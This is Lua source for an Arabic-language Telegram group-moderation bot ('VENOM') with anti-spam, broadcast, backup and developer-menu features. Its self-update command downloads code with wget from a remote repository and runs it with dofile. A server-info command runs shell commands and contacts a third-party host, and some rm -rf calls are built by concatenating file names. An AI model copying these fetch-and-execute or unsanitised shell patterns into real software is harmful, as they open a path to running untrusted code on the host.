local File = io.open('./'..bot_id..'.json', "w")
File:write(t)
File:close()
sendDocument(msg.chat_id_, msg.id_,0, 1, nil, './'..bot_id..'.json', '- عدد جروبات التي في البوت { '..#list..'}')
end
function download_to_file(url, file_path) 
local respbody = {} 
local options = { url = url, sink = ltn12.sink.table(respbody), redirect = true } 
local response = nil 
options.redirect = false 
response = {https.request(options)} 
local code = response[2] 
local headers = response[3] 
local status = response[4] 
if code ~= 200 then return false, code 
end 
file = io.open(file_path, "w+") 
file:write(table.concat(respbody)) 
file:close() 
return file_path, code 
end 
function Addjpg(msg,chat,ID_FILE,File_Name)
local File = json:decode(https.request('https://api.telegram.org/bot'.. token..'/getfile?file_id='..ID_FILE)) 
download_to_file('https://api.telegram.org/file/bot'..token..'/'..File.result.file_path,File_Name) 
sendPhoto(msg.chat_id_, msg.id_, 0, 1, nil,'./'..File_Name,'تم تحويل الملصق الى صوره')     
os.execute('rm -rf ./'..File_Name) 
end
function Addvoi(msg,chat,vi,ty)
local eq = json:decode(https.request('https://api.telegram.org/bot'.. token..'/getfile?file_id='..vi)) 
download_to_file('https://api.telegram.org/file/bot'..token..'/'..eq.result.file_path,ty) 
sendVoice(msg.chat_id_, msg.id_, 0, 1, nil, './'..ty)   
os.execute('rm -rf ./'..ty) 
end
function Addmp3(msg,chat,kkl,ffrr)
local eer = json:decode(https.request('https://api.telegram.org/bot'.. token..'/getfile?file_id='..kkl)) 
download_to_file('https://api.telegram.org/file/bot'..token..'/'..eer.result.file_path,ffrr) 
sendAudio(msg.chat_id_,msg.id_,'./'..ffrr,"🎼 𝗺𝗼𝘂𝘀𝗹𝗶𝗺")  
os.execute('rm -rf ./'..ffrr) 
end
function Addsticker(msg,chat,Sd,rre)
local Qw = json:decode(https.request('https://api.telegram.org/bot'.. token..'/getfile?file_id='..Sd)) 
download_to_file('https://api.telegram.org/file/bot'..token..'/'..Qw.result.file_path,rre) 
sendSticker(msg.chat_id_, msg.id_, 0, 1, nil, './'..rre)
os.execute('rm -rf ./'..rre) 
end
function AddFile_Bot(msg,chat,ID_FILE,File_Name)
if File_Name:match('.json') then
if tonumber(File_Name:match('(%d+)')) ~= tonumber(bot_id) then 
send(chat,msg.id_," 𖥔  ملف نسخه ليس لهاذا البوت")
return false 
end      
local File = json:decode(https.request('https://api.telegram.org/bot'.. token..'/getfile?file_id='..ID_FILE) ) 
download_to_file('https://api.telegram.org/file/bot'..token..'/'..File.result.file_path, ''..File_Name) 
send(chat,msg.id_," 𖥔  جاري ...\n 𖥔  رفع الملف الان")
else
send(chat,msg.id_,"* 𖥔 عذرا الملف ليس بصيغة {JSON} يرجى رفع الملف الصحيح*")
end      
local info_file = io.open('./'..bot_id..'.json', "r"):read('*a')
local groups = JSON.decode(info_file)
for idg,v in pairs(groups.GP_BOT) do
database:sadd(bot_id..'Chek:Groups',idg)  
database:set(bot_id..'lock:tagservrbot'..idg,true)   
list ={"lock:Bot:kick","lock:user:name","lock:hashtak","lock:Cmd","lock:Link","lock:forward","lock:Keyboard","lock:geam","lock:Photo","lock:Animation","lock:Video","lock:Audio","lock:vico","lock:Sticker","lock:Document","lock:Unsupported","lock:Markdaun","lock:Contact","lock:Spam"}
for i,lock in pairs(list) do 
database:set(bot_id..lock..idg,'del')    
end
if v.MNSH then
for k,idmsh in pairs(v.MNSH) do
database:sadd(bot_id..'Constructor'..idg,idmsh)
end
end
if v.MDER then
for k,idmder in pairs(v.MDER) do
database:sadd(bot_id..'Manager'..idg,idmder)  
end
end
if v.MOD then
for k,idmod in pairs(v.MOD) do
database:sadd(bot_id..'Mod:User'..idg,idmod)  
end
end
if v.ASAS then
for k,idASAS in pairs(v.ASAS) do
database:sadd(bot_id..'Basic:Constructor'..idg,idASAS)  
end
end
end
send(chat,msg.id_,"\n 𖥔 تم رفع الملف بنجاح وتفعيل الجروبات\n 𖥔 ورفع {الامنشئين الاساسين ; والمنشئين ; والمدراء; والادمنيه} بنجاح")
end
local function trigger_anti_spam(msg,type)
tdcli_function ({ID = "GetUser",user_id_ = msg.sender_user_id_},function(arg,data)
local Name = '['..utf8.sub(data.first_name_,0,40)..'](tg://user?id='..data.id_..')'
if type == 'kick' then 
Text = '\n 𖥔 العضــو  ↚ 「'..Name..'」\n 𖥔 قام بالتكرار هنا وتم طرده '  
sendText(msg.chat_id_,Text,0,'md')
chat_kick(msg.chat_id_,msg.sender_user_id_) 
my_ide = msg.sender_user_id_
msgm = msg.id_
local num = 100
for i=1,tonumber(num) do
tdcli_function ({ID = "GetMessages",chat_id_ = msg.chat_id_,message_ids_ = {[0] = msgm}},function(arg,data) 
if data.messages_[0] ~= false then
if tonumber(my_ide) == (data.messages_[0].sender_user_id_) then
DeleteMessage(msg.chat_id_, {[0] = data.messages_[0].id_})
end;end;end, nil)
msgm = msgm - 1048576
end
return false  
end 
if type == 'del' then 
DeleteMessage(msg.chat_id_,{[0] = msg.id_})    
my_ide = msg.sender_user_id_
msgm = msg.id_
local num = 100
for i=1,tonumber(num) do
tdcli_function ({ID = "GetMessages",chat_id_ = msg.chat_id_,message_ids_ = {[0] = msgm}},function(arg,data) 
if data.messages_[0] ~= false then
if tonumber(my_ide) == (data.messages_[0].sender_user_id_) then
DeleteMessage(msg.chat_id_, {[0] = data.messages_[0].id_})
end;end;end, nil)
msgm = msgm - 1048576
end
end 
if type == 'keed' then
https.request("https://api.telegram.org/bot" .. token .. "/restrictChatMember?chat_id=" ..msg.chat_id_.. "&user_id=" ..msg.sender_user_id_.."") 
database:sadd(bot_id..'Muted:User'..msg.chat_id_,msg.sender_user_id_) 
msgm = msg.id_
my_ide = msg.sender_user_id_
local num = 100
for i=1,tonumber(num) do
tdcli_function ({ID = "GetMessages",chat_id_ = msg.chat_id_,message_ids_ = {[0] = msgm}},function(arg,data) 
if data.messages_[0] ~= false then
if tonumber(my_ide) == (data.messages_[0].sender_user_id_) then
DeleteMessage(msg.chat_id_, {[0] = data.messages_[0].id_})
end;end;end, nil)
msgm = msgm - 1048576
end
Text = '\n 𖥔 العضــو  ↚ 「'..Name..'」\n 𖥔 قام بالتكرار هنا وتم تقييده '  
sendText(msg.chat_id_,Text,0,'md')
return false  
end  
if type == 'mute' then
Text = '\n 𖥔 العضــو  ↚ 「'..Name..'」\n 𖥔 قام بالتكرار هنا وتم كتمه '  
sendText(msg.chat_id_,Text,0,'md')
database:sadd(bot_id..'Muted:User'..msg.chat_id_,msg.sender_user_id_) 
msgm = msg.id_
my_ide = msg.sender_user_id_
local num = 100
for i=1,tonumber(num) do
tdcli_function ({ID = "GetMessages",chat_id_ = msg.chat_id_,message_ids_ = {[0] = msgm}},function(arg,data) 
if data.messages_[0] ~= false then
if tonumber(my_ide) == (data.messages_[0].sender_user_id_) then
DeleteMessage(msg.chat_id_, {[0] = data.messages_[0].id_})
end;end;end, nil)
msgm = msgm - 1048576
end
return false  
end
end,nil)   
end  
function plugin_VENOM(msg)
for v in io.popen('ls File_Bot'):lines() do
if v:match(".lua$") then
plugin = dofile("File_Bot/"..v)
if plugin.VENOM and msg then
pre_msg = plugin.VENOM(msg)
end
end
end
send(msg.chat_id_, msg.id_,pre_msg)  
end
--------------------------------------------------------------------------------------------------------------
function SourceVENOM(msg,data) -- بداية العمل
if msg then
local text = msg.content_.text_
--------------------------------------------------------------------------------------------------------------
if msg.chat_id_ then
local id = tostring(msg.chat_id_)
if id:match("-100(%d+)") then
database:incr(bot_id..'Msg_User'..msg.chat_id_..':'..msg.sender_user_id_) 
Chat_Type = 'GroupBot' 
elseif id:match("^(%d+)") then
database:sadd(bot_id..'User_Bot',msg.sender_user_id_)  
Chat_Type = 'UserBot' 
else
Chat_Type = 'GroupBot' 
end
end
if database:get(bot_id.."Bc:Grops:Pin" .. msg.chat_id_ .. ":" .. msg.sender_user_id_) then 
if text == "الغاء" or text == "الغاء 𖥔" then   
send(msg.chat_id_, msg.id_," 𖥔 تم الغاء الاذاعه")
database:del(bot_id.."Bc:Grops:Pin" .. msg.chat_id_ .. ":" .. msg.sender_user_id_) 
return false
end 
local list = database:smembers(bot_id.."Chek:Groups") 
if msg.content_.text_ then
for k,v in pairs(list) do 
send(v, 0,"["..msg.content_.text_.."]")  
database:set(bot_id..'Msg:Pin:Chat'..v,msg.content_.text_) 
end
elseif msg.content_.photo_ then
if msg.content_.photo_.sizes_[0] then
photo = msg.content_.photo_.sizes_[0].photo_.persistent_id_
elseif msg.content_.photo_.sizes_[1] then
photo = msg.content_.photo_.sizes_[1].photo_.persistent_id_
end
for k,v in pairs(list) do 
sendPhoto(v, 0, photo,(msg.content_.caption_ or ""))
database:set(bot_id..'Msg:Pin:Chat'..v,photo) 
end 
elseif msg.content_.animation_ then
for k,v in pairs(list) do 
sendDocument(v, 0, msg.content_.animation_.animation_.persistent_id_,(msg.content_.caption_ or "")) 
database:set(bot_id..'Msg:Pin:Chat'..v,msg.content_.animation_.animation_.persistent_id_)
end 
elseif msg.content_.sticker_ then
for k,v in pairs(list) do 
sendSticker(v, 0, msg.content_.sticker_.sticker_.persistent_id_)   
database:set(bot_id..'Msg:Pin:Chat'..v,msg.content_.sticker_.sticker_.persistent_id_) 
end 
end
send(msg.chat_id_, msg.id_," 𖥔 تمت الاذاعه الى *~ "..#list.." ~* كروب ")
database:del(bot_id.."Bc:Grops:Pin" .. msg.chat_id_ .. ":" .. msg.sender_user_id_) 
return false
end

------by-banda--
if text == "/start" then
if not Devban(msg) then
local Namebot = (database:get(bot_id..'Name:Bot') or 'فينوم') 
local VENOM_Msg = { 
'  🤖╖ أهلآ بك عزيزي أنا بوت '..Namebot..'\n🌐╢ وظيفتي حماية المجموعات\n✅╢ لتفعيل البوت عليك اتباع مايلي \n🔘╢ أضِف البوت إلى مجموعتك\n⚡️╢ ارفعهُ » مشرف\n⬆️╜ سيتم ترقيتك مالك في البوت\n',
} 
Namebot = VENOM_Msg[math.random(#VENOM_Msg)] 
local msg_id = msg.id_/2097152/0.5  
keyboard = {} 
keyboard.inline_keyboard = {
{
{text = 'معلومات', callback_data="/change-hhh"},{text = 'السورس', callback_data="/change-siusr"},
},
{
{text = 'الابراج', callback_data="/zVNOd"},{text = 'الالعاب', callback_data="/add"},
},
{
{text = '𖥔 الـمـطـور 𖥔', url="http://t.me/"..sudos.UserName},
},
{
{text = '𖥔 اضفني الي مجموعتك 𖥔' ,url="t.me/"..dofile("./Info.lua").botUserName.."?startgroup=start"},
},
}
local function getpro(extra, result, success) 
if result.photos_[0] then 
https.request("https://api.telegram.org/bot"..token..'/sendPhoto?chat_id=' .. msg.chat_id_ .. '&photo='..result.photos_[0].sizes_[1].photo_.persistent_id_..'&caption=' .. URL.escape(Namebot).."&photo="..msg_id.."&parse_mode=markdown&disable_web_page_preview=true&reply_markup="..JSON.encode(keyboard)) 
else 
send(msg.chat_id_, msg.id_,Namebot, 1, 'md') 
end 
end 
tdcli_function ({ ID = "GetUserProfilePhotos", user_id_ = bot_id, offset_ = 0, limit_ = 1 }, getpro, nil) 
end
end
--------------------------------------------------------------------------------------------------------------
if Chat_Type == 'UserBot' then
if text == '/start' or text == '「رجوع」' then  
if AddChannel(msg.sender_user_id_) == false then
local textchuser = database:get(bot_id..'text:ch:user')
if textchuser then
send(msg.chat_id_, msg.id_,'['..textchuser..']')
else
send(msg.chat_id_, msg.id_,' 𖥔لا تستطيع استخدام البوت يرجى الاشتراك في القناة حتى تتمكن من استخدام الاوامر \n 𖥔اشترك هنا ['..database:get(bot_id..'add:ch:username')..']')
end
return false
end
if Devban(msg) then
local bl = '●انت الان المطور الاساسي في البوت \n● سورس ناسا\n ●يمكنك تحكم في البوتات من الكيبورد أسفل \n[تابع جديدنا](t.me/ch_nasa)'
local keyboard = {
{'ضع اسم للبوت','معلومات الكيبورد'},
{'المطور','الاحصائيات'},
{'⇣────「الاقسام」────⇣'},
{'「تواصل لسورس」'},
{'「اوامر الاذاعه」','「اوامر اضف」'},
{'「اوامر التفعيل」','「اوامر الحمايه」'},
{'⇣────「الركن الاخير」────⇣'},
{'جلب المشتركين','جلب النسخه'},
{'جلب المطورين','جلب التوكن'},
{'تحديث السورس ','الاصدار'},
{'معلومات السيرفر'},
{'الغاء'},
}
send_inline_key(msg.chat_id_,bl,keyboard)
end
end

if not Devban(msg) and not database:sismember(bot_id..'VNO:User_Bot',msg.sender_user_id_) and not database:get(bot_id..'Tuasl:Bots') then
send(msg.sender_user_id_, msg.id_,'  ')
tdcli_function ({ID = "ForwardMessages", chat_id_ = SUDO,    from_chat_id_ = msg.sender_user_id_,    message_ids_ = {[0] = msg.id_},    disable_notification_ = 1,    from_background_ = 1 },function(arg,data) 
tdcli_function ({ID = "GetUser",user_id_ = msg.sender_user_id_},function(arg,ta) 
vardump(data)
if data and data.messages_[0].content_.sticker_ then
local Name = '['..string.sub(ta.first_name_,0, 40)..'](tg://user?id='..ta.id_..')'
local Text = ' 𖥔تم ارسال الملصق من ↓\n - '..Name
sendText(SUDO,Text,0,'md')
end 
end,nil) 
end,nil)
end
if Devban(msg) and msg.reply_to_message_id_ ~= 0  then    
tdcli_function({ID = "GetMessage",chat_id_ = msg.chat_id_,message_id_ = tonumber(msg.reply_to_message_id_)},function(extra, result, success) 
if result.forward_info_.sender_user_id_ then     
id_user = result.forward_info_.sender_user_id_    
end     
tdcli_function ({ID = "GetUser",user_id_ = id_user},function(arg,data) 
if text == 'حظر' then
local Name = '['..string.sub(data.first_name_,0, 40)..'](tg://user?id='..id_user..')'
local Text = ' 𖥔المستخدم ↚ 「'..Name..'」\n 𖥔تم حظره من التواصل'
sendText(SUDO,Text,msg.id_/2097152/0.5,'md')
database:sadd(bot_id..'VNO:User_Bot',data.id_)  
return false  
end 
if text =='الغاء الحظر' then
local Name = '['..string.sub(data.first_name_,0, 40)..'](tg://user?id='..id_user..')'
local Text = ' 𖥔المستخدم ↚ 「'..Name..'」\n 𖥔تم الغاء حظره من التواصل'
sendText(SUDO,Text,msg.id_/2097152/0.5,'md')
database:srem(bot_id..'VNO:User_Bot',data.id_)  
return false  
end 

tdcli_function({ID='GetChat',chat_id_ = id_user},function(arg,dataq)
tdcli_function ({ ID = "SendChatAction",chat_id_ = id_user, action_ = {  ID = "SendMessageTypingAction", progress_ = 100} },function(arg,ta) 
if ta.code_ == 400 or ta.code_ == 5 then
local VENOM_Msg = '\n 𖥔قام الشخص بحظر البوت'
send(msg.chat_id_, msg.id_,VENOM_Msg) 
return false  
end 
if text then    
send(id_user,msg.id_,text)    
local Name = '['..string.sub(data.first_name_,0, 40)..'](tg://user?id='..id_user..')'
local Text = ' 𖥔المستخدم ↚ 「'..Name..'」\n 𖥔تم ارسال الرساله اليه'
sendText(SUDO,Text,msg.id_/2097152/0.5,'md')
return false
end    
if msg.content_.ID == 'MessageSticker' then    
sendSticker(id_user, msg.id_, 0, 1, nil, msg.content_.sticker_.sticker_.persistent_id_)   
local Name = '['..string.sub(data.first_name_,0, 40)..'](tg://user?id='..id_user..')'
local Text = ' 𖥔المستخدم ↚ 「'..Name..'」\n 𖥔تم ارسال الرساله اليه'
sendText(SUDO,Text,msg.id_/2097152/0.5,'md')
return false
end      
if msg.content_.ID == 'MessagePhoto' then    
sendPhoto(id_user, msg.id_, 0, 1, nil,msg.content_.photo_.sizes_[0].photo_.persistent_id_,(msg.content_.caption_ or ''))    
local Name = '['..string.sub(data.first_name_,0, 40)..'](tg://user?id='..id_user..')'
local Text = ' 𖥔المستخدم ↚ 「'..Name..'」\n 𖥔تم ارسال الرساله اليه'
sendText(SUDO,Text,msg.id_/2097152/0.5,'md')
return false
end     
if msg.content_.ID == 'MessageAnimation' then    
sendDocument(id_user, msg.id_, 0, 1,nil, msg.content_.animation_.animation_.persistent_id_)    
local Name = '['..string.sub(data.first_name_,0, 40)..'](tg://user?id='..id_user..')'
local Text = ' 𖥔المستخدم ↚ 「'..Name..'」\n 𖥔تم ارسال الرساله اليه'
sendText(SUDO,Text,msg.id_/2097152/0.5,'md')
return false
end     
if msg.content_.ID == 'MessageVoice' then    
sendVoice(id_user, msg.id_, 0, 1, nil, msg.content_.voice_.voice_.persistent_id_)    
local Name = '['..string.sub(data.first_name_,0, 40)..'](tg://user?id='..id_user..')'
local Text = ' 𖥔المستخدم ↚ 「'..Name..'」\n 𖥔تم ارسال الرساله اليه'
sendText(SUDO,Text,msg.id_/2097152/0.5,'md')
return false
end     
end,nil)
end,nil)
end,nil)
end,nil)
end 
if text == 'تفعيل النسخه التلقائيه' and SudoBot(msg) then  
send(msg.chat_id_, msg.id_,"𖥔 تم تفعيل النسخه الاحتياطيه التلقائيه") 
database:del(bot_id.."AutoFile")
end
if text == 'تعطيل النسخه التلقائيه' and SudoBot(msg) then  
send(msg.chat_id_, msg.id_,"𖥔 تم تعطيل النسخه الاحتياطيه التلقائيه") 
database:set(bot_id.."AutoFile",true) 
end
if text == 'تفعيل التواصل ' and Devban(msg) then  
if database:get(bot_id..'Tuasl:Bots') then
database:del(bot_id..'Tuasl:Bots') 
Text = '\n 𖥔 تم تفعيل التواصل ' 
else
Text = '\n 𖥔 بالتاكيد تم تفعيل التواصل '
end
send(msg.chat_id_, msg.id_,Text) 
end
if text == 'تعطيل التواصل ' and Devban(msg) then  
if not database:get(bot_id..'Tuasl:Bots') then
database:set(bot_id..'Tuasl:Bots',true) 
Text = '\n 𖥔 تم تعطيل التواصل' 
else
Text = '\n 𖥔 بالتاكيد تم تعطيل التواصل'
end
send(msg.chat_id_, msg.id_,Text) 
end
if text == 'تفعيل البوت الخدمي ' and Devban(msg) then  
if database:get(bot_id..'Free:Bots') then
database:del(bot_id..'Free:Bots') 
Text = '\n 𖥔 تم تفعيل البوت الخدمي ' 
else
Text = '\n 𖥔 بالتاكيد تم تفعيل البوت الخدمي '
end
send(msg.chat_id_, msg.id_,Text) 
end
if text == 'تعطيل البوت الخدمي ' and Devban(msg) then  
if not database:get(bot_id..'Free:Bots') then
database:set(bot_id..'Free:Bots',true) 
Text = '\n 𖥔 تم تعطيل البوت الخدمي' 
else
Text = '\n 𖥔 بالتاكيد تم تعطيل البوت الخدمي'
end
send(msg.chat_id_, msg.id_,Text) 
end
if text and database:get(bot_id..'Start:Bots') then
if text == 'الغاء' or text == 'الغاء' then   
send(msg.chat_id_, msg.id_,' 𖥔 الغاء حفظ كليشه ستارت')
database:del(bot_id..'Start:Bots') 
return false
end
database:set(bot_id.."Start:Bot",text)  
send(msg.chat_id_, msg.id_,' 𖥔 تم حفظ كليشه ستارت')
database:del(bot_id..'Start:Bots') 
return false
end
if text == 'اضف رد استارت' and Devban(msg) then 
database:set(bot_id..'Tuasl:Bots',true) 
send(msg.chat_id_, msg.id_,' 𖥔 ارسل لي رد الان')
return false
end
if text == 'مسح رد استارت' and Devban(msg) then 
database:del(bot_id..'Tuasl:Bots') 
send(msg.chat_id_, msg.id_,' 𖥔 تم مسح رد استارت')
end
if text == 'ضع كليشه ستارت' and Devban(msg) then 
database:set(bot_id..'Start:Bots',true) 
send(msg.chat_id_, msg.id_,' 𖥔 ارسل لي الكليشه الان')
return false
end
if text == 'مسح كليشه ستارت' and Devban(msg) then 
database:del(bot_id..'Start:Bot') 
send(msg.chat_id_, msg.id_,' 𖥔 تم مسح كليشه ستارت')
end
if text == 'معلومات السيرفر' and Devban(msg) then 
send(msg.chat_id_, msg.id_, io.popen([[
linux_version=`lsb_release -ds`
memUsedPrc=`free -m | awk 'NR==2{printf "%sMB/%sMB {%.2f%}\n", $3,$2,$3*100/$2 }'`
HardDisk=`df -lh | awk '{if ($6 == "/") { print $3"/"$2" ~ {"$5"}" }}'`
CPUPer=`top -b -n1 | grep "Cpu(s)" | awk '{print $2 + $4}'`
uptime=`uptime | awk -F'( |,|:)+' '{if ($7=="min") m=$6; else {if ($7~/^day/) {d=$6;h=$8;m=$9} else {h=$6;m=$7}}} {print d+0,"days,",h+0,"hours,",m+0,"minutes."}'`
echo '📟l •⊱ 「 نظام التشغيل 」 ⊰•\n* '"$linux_version"'*' 
echo '⩹━━━━ꪜꫀꪀꪮꪑ━━━━⩺\n 🖨️l •⊱ 「 الذاكره العشوائيه 」  ⊰•\n「* '"$memUsedPrc"'*」'
echo '⩹━━━━ꪜꫀꪀꪮꪑ━━━━⩺\n 💾l •⊱ 「 وحـده الـتـخـزيـن 」  ⊰•\n「* '"$HardDisk"'*」'
echo '⩹━━━━ꪜꫀꪀꪮꪑ━━━━⩺\n 🖥️l •⊱ 「 موقـع الـسـيـرفـر 」 ⊰•\n「*»» '`curl http://th3boss.com/ip/location`'*」'
echo '⩹━━━━ꪜꫀꪀꪮꪑ━━━━⩺\n 🕹️l •⊱ 「 الـمــعــالــج 」  ⊰•\n「* '"`grep -c processor /proc/cpuinfo`""Core ~ 「$CPUPer%」 "'*」'
echo '⩹━━━━ꪜꫀꪀꪮꪑ━━━━⩺\n 👨🏾‍🔧l •⊱ 「 الــدخــول 」  ⊰•\n「* '`whoami`'*」'
echo '⩹━━━━ꪜꫀꪀꪮꪑ━━━━⩺\n 🔌l •⊱ 「 مـده تـشغيـل الـسـيـرفـر 」 ⊰•\n「* '"$uptime"'*」'
]]):read('*all'))  
end
if text == 'تحديث السورس ' and Devban(msg) then 
os.execute('rm -rf VENOM.lua')
os.execute('wget https://raw.githubusercontent.com/VENOM197/Venom/main/VENOM.lua')
send(msg.chat_id_, msg.id_,' 𖥔 تم تحديث السورس')
dofile('VENOM.lua')  
end
if text == 'جلب المشتركين' and Devban(msg) then 
local list = database:smembers(bot_id..'User_Bot') 
local t = '{"users":['   
for k,v in pairs(list) do 
if k == 1 then 
t =  t..'"'..v..'"' 
else 
t =  t..',"'..v..'"' 
end 
end 
t = t..']}' 
local File = io.open('./users.json', "w") 
File:write(t) 
File:close() 
sendDocument(msg.chat_id_, msg.id_,0, 1, nil, './users.json', ' عدد المشتركين { '..#list..'}') 
end

if text == 'رفع المشتركين' and Devban(msg) then 
function by_reply(extra, result, success)    
if result.content_.document_ then  
local ID_FILE = result.content_.document_.document_.persistent_id_  
local File_Name = result.content_.document_.file_name_ 
local File = json:decode(https.request('https://api.telegram.org/bot'.. token..'/getfile?file_id='..ID_FILE) )  
download_to_file('https://api.telegram.org/file/bot'..token..'/'..File.result.file_path, ''..File_Name)  
local info_file = io.open('./users.json', "r"):read('*a') 
local users = JSON.decode(info_file) 
for k,v in pairs(users.users) do 
database:sadd(bot_id..'User_Bot',v)  
end 
send(msg.chat_id_,msg.id_,'تم رفع المشتركين ') 
end    
end 
tdcli_function ({ ID = "GetMessage", chat_id_ = msg.chat_id_, message_id_ = tonumber(msg.reply_to_message_id_) }, by_reply, nil) 
end

if text == '「تواصل لسورس」' and Devban(msg) then 
local Text = 'قسم مطورين السورس لدخول الي حسابتهم'
local Key = {
{'⇣───「 قـناه المطورين」───⇣'},
{'قناة السورس','التواصل'},
{'「رجوع」'},
}
send_inline_key(msg.chat_id_,Text,Key)
end 
if text == '「اوامر اضف」' and Devban(msg) then 
local Text = 'قسم مسح واضف مثلا اضف رد عام مسح رد عام'
local Key = {
{'اضف رد عام','مسح رد عام'},
{'مسح رد استارت','اضف رد استارت'},
{'اضف رد متعدد','مسح رد متعدد'},
{'مسح الردود','مسح الردود المتعدده'},
{'مسح الثانوين'},
{'ضع كليشه ستارت','مسح كليشه ستارت'},
{'ضع قناة الاشتراك','مسح رساله الاشتراك'},
{'「رجوع」'},
}
send_inline_key(msg.chat_id_,Text,Key)
end 


if text == '「اوامر التفعيل」' and Devban(msg) then 
local Text = 'قسم التفعيل والتعطيل لتفعيل كل شئ في البوت'
local Key = {
{'تعطيل الاذاعه','تفعيل الاذاعه'},
{'تعطيل المغادره','تفعيل المغادره'},
{'تعطيل التواصل ','تفعيل التواصل '},
{'تفعيل الاشتراك الاجباري','تعطيل الاشتراك الاجباري'},
{'تفعيل البوت الخدمي ','تعطيل البوت الخدمي '},
{'「رجوع」'},
}
send_inline_key(msg.chat_id_,Text,Key)
end 
if text == '「اوامر الحمايه」' and Devban(msg) then 
local Text = 'قسم الحمايه يوجد في المطورين والثانوين والخ...'
local Key = {
{'قائمه الكتم العام','المطورين','قائمه العام'},
{'المشتركين','الجروبات ','الردود العامه'},
{'الثانوين','الردود المتعدده'},
{'تنظيف الجروبات ','تنظيف المشتركين'},
{'تغير رساله الاشتراك ','الاشتراك الاجباري','تغير الاشتراك'},
{'「رجوع」'},
}
send_inline_key(msg.chat_id_,Text,Key)
end 
if text == '「اوامر الاذاعه」' and Devban(msg) then 
local Text = 'قسم الاذاعات لعمل اذاعه في البوت'
local Key = {
{'اذاعه ','اذاعه خاص '},
{'اذاعه بالتثبيت '},
{'اذاعه بالتوجيه ','اذاعه بالتوجيه خاص '},
{'「رجوع」'},
}
send_inline_key(msg.chat_id_,Text,Key)
end 

if text == "المطور" or text == "مطور" then
local TEXT_SUD = database:get(bot_id..'Tshake:TEXT_SUDO')
if TEXT_SUDO then 
send(msg.chat_id_, msg.id_,TEXT_SUDO)
else
tdcli_function ({ID = "GetUser",user_id_ = SUDO,},function(arg,result) 
local function taha(extra, taha, success)
if taha.photos_[0] then
local Name = '〈 المطور 〉 -\n['..result.first_name_..'](tg://user?id='..result.id_..')\n'
keyboard = {} 
keyboard.inline_keyboard = {
{
{text = ''..result.first_name_..'', url = "https://t.me/"..result.username_..""},
},
{
{text = '𖥔 اضفني الي مجموعتك 𖥔 ' ,url="t.me/"..dofile("./Info.lua").botUserName.."?startgroup=start"},
},
}
local msg_id = msg.id_/2097152/0.5
https.request("https://api.telegram.org/bot"..token..'/sendPhoto?chat_id='..msg.chat_id_..'&caption='..URL.escape(Name)..'&photo='..taha.photos_[0].sizes_[1].photo_.persistent_id_..'&reply_to_message_id='..msg_id..'&parse_mode=markdown&disable_web_page_preview=true&reply_markup='..JSON.encode(keyboard)) 
else
sendText(msg.chat_id_,Name,msg.id_/2097152/0.5,'md')
 end end
tdcli_function ({ ID = "GetUserProfilePhotos", user_id_ = SUDO, offset_ = 0, limit_ = 1 }, taha, nil)
end,nil)
end
end

if text == 'جلب المطورين' and Devban(msg) then  
local list = database:smembers(bot_id..'Sudo:User') 
local t = '{"users":['   
for k,v in pairs(list) do 
if k == 1 then 
t =  t..'"'..v..'"' 
else 
t =  t..',"'..v..'"' 
end 
end 
t = t..']}' 
local File = io.open('./sudos3.json', "w") 
File:write(t) 
File:close() 
sendDocument(msg.chat_id_, msg.id_,0, 1, nil, './sudos3.json', ' عدد المطورين { '..#list..'}') 
end 
if text == 'رفع المطورين' and Devban(msg) then 
function by_reply(extra, result, success)    
if result.content_.document_ then  
local ID_FILE = result.content_.document_.document_.persistent_id_  
local File_Name = result.content_.document_.file_name_ 
local File = json:decode(https.request('https://api.telegram.org/bot'.. token..'/getfile?file_id='..ID_FILE) )  
download_to_file('https://api.telegram.org/file/bot'..token..'/'..File.result.file_path, ''..File_Name)  
local info_file = io.open('./sudos3.json', "r"):read('*a') 
local users = JSON.decode(info_file) 
for k,v in pairs(users.users) do 
database:sadd(bot_id..'Sudo:User',v)  
end 
send(msg.chat_id_,msg.id_,'تم رفع المطورين ') 
end    
end 
tdcli_function ({ ID = "GetMessage", chat_id_ = msg.chat_id_, message_id_ = tonumber(msg.reply_to_message_id_) }, by_reply, nil) 
end
if text == 'الاصدار' and Devban(msg) then 
database:del(bot_id..'Srt:Bot') 
send(msg.chat_id_, msg.id_,' 𖥔 اصدار سورس فينوم{ S:1✓}')
end
if text == '⇣───「 قـناه المطورين」───⇣' then
local Text = [[ 
قناه مطورين السورس 🍂
محتاج تنصب بوت حمايه ببلاش تواصل معانا✅
]]
keyboard = {}  
keyboard.inline_keyboard = { 
{{text = 'مطورين السورس⚙', url="t.me/U880p"}}, 
} 
local msg_id = msg.id_/2097152/0.5 
https.request("https://api.telegram.org/bot"..token..'/sendPhoto?chat_id=' .. msg.chat_id_ .. '&photo=https://t.me/vagwg/8&caption=' .. URL.escape(Text).."&reply_to_message_id="..msg_id.."&parse_mode=markdown&disable_web_page_preview=true&reply_markup="..JSON.encode(keyboard)) 
end


if text == 'معلومات الكيبورد' and Devban(msg) then
database:del(bot_id..'Srt:Bot') 
local Text = [[ 
[CH](t.me/SOURCEVENOM)مرحبا بك مطوري سأشرح لك كل شئ في لوحه الاوامر بالتفصيل
1• الاحصائيات { لعرض عدد المجموعات، والمشتركين في البوت
 2• تفعيل التواصل{ لتفعيل التواصل عبر البوت خاص بك} 
 3• تعطيل التواصل{ لتعطيل التواصل عبر البوت خاص بك } 
 4• قائمه العام { لعرض المحظورين عام في البوت }
 5• المطورين { لعرض المطورين في بوتك }
8• اذاعه { ارسال رساله لجميع الجروبات في بوتك }
9• اذاعه خاص { ارسال رساله لجميع مشتركين بوتك!} 
10• تعطيل الاشتراك الاجباري { لتعطيل الاشتراك جباري خاص بوتك}
11• تفعيل الاشتراك الاجباري { لتفعيل الاشتراك الاجباري بوتك }
12•اذاعه بالتوجيه { ارسال رساله بالتوجيه الي جميع المجموعات }
13• اذاعه بالتوجيه خاص { ارسال رساله بالتوجيه الي جميع المشتركين }
14• تفعيل البوت الخدمي { يمكن هاذا امر ان منشئ الكروب يفعل البوت م̷ـــِْن دون حتياجه لمطور البوت
15• تعطيل البوت الخدمي { يمك هل خاصيه ان تفعيل البوت اله مطورين البوت فقط }
16• تنظيف المشتركين { يمكنك ازاله المشتركين الوهمين عبر هل امر }
17• تنظيف الجروبات { يمكن ازاله المجموعات الوهميه عبر عل امر }
18• جلب نسخه احتياطيه { لعرض ملف المجموعات بوتك }
19• تحديث السورس { لتحديث السورس خاص بوتك 
20• الغاء { للغاء الامر الذي طلبته }
]] 
keyboard = {}  
keyboard.inline_keyboard = { 
{{text = 'قناه السورس', url="t.me/SOURCEVENOM"}}, 
} 
local msg_id = msg.id_/2097152/0.5 
